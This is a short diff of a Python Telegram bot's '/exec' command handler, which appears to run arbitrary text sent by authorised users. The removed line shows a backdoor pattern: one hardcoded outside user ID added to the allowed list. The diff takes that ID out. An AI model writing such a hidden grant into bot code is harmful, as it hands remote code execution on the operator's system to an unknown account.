@@ -6,7 +6,7 @@ import sys
 import io
 from . import *
 
-@bot.on(events.NewMessage(pattern="^/exec ?(.*)", from_users=SUDOS + [5591954930]))
+@bot.on(events.NewMessage(pattern="^/exec ?(.*)", from_users=SUDOS))
 async def _(event):
     try:
         cmd = event.text.split(" ", maxsplit=1)[1]
